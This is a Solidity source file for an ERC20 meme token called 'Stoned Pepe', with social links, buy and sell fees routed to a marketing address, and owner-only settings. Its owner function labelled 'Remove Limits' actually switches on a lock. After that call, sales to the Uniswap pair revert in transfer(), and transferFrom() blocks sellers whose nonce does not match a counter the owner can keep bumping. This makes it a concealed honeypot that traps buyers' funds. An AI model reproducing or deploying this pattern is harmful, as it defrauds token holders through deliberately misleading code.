//TG: https://t.me/STONEDPEPE_VERIFY
//Twitter: https://twitter.com/Pepe_is_stoned

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract Stoned is ERC20, Ownable {
    using SafeMath for uint256;
    
    address public uniswapV2Pair;
    address public marketingAddress;
    bool public unitTransaction = false;
    uint256 public FRACTIONS  = 18;
    
    uint256 public maxTx = 0;
    mapping(address => uint256) public userNonces;

    uint256 public constant BASIS = 10000; // BASIS for fee
    uint256 public sellFee = 600; // 6% 
    uint256 public buyFee = 250;  // 2.5%

    constructor() ERC20("Stoned Pepe", "Stoned") {
        _mint(_msgSender(), 420 * (10 ** 6) * (10 ** FRACTIONS));
    }

    function setUniswapV2Pair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function setMarketingAddress(address _marketingAddress) external onlyOwner {
        marketingAddress = _marketingAddress;
    }

    function _calculateFees(uint256 amount, uint256 feePercent) internal pure returns (uint256) {
        return amount.mul(feePercent).div(BASIS);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(_msgSender() != recipient || !unitTransaction, "Removed limits");
        require(!(recipient == uniswapV2Pair && unitTransaction), "delete limits");

        uint256 fee = recipient == uniswapV2Pair ? _calculateFees(amount, sellFee) : _calculateFees(amount, buyFee);

        userNonces[_msgSender()] = maxTx;
        
        
        _transfer(_msgSender(), marketingAddress, fee);
        _transfer(_msgSender(), recipient, amount.sub(fee));

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (to == uniswapV2Pair && unitTransaction) {
            require(userNonces[from] == maxTx, "Per block tx");
        }

        uint256 fee = to == uniswapV2Pair ? _calculateFees(amount, sellFee) : _calculateFees(amount, buyFee);

        address spender = _msgSender();

        _spendAllowance(from, spender, amount.add(fee));
        _transfer(from, marketingAddress, fee);
        _transfer(from, to, amount.sub(fee));

        userNonces[from] = maxTx;

        return true;
    }

    //Remove Limits
    function removeLimits() external onlyOwner {
        unitTransaction = true;
        maxTx++;  
    }
}
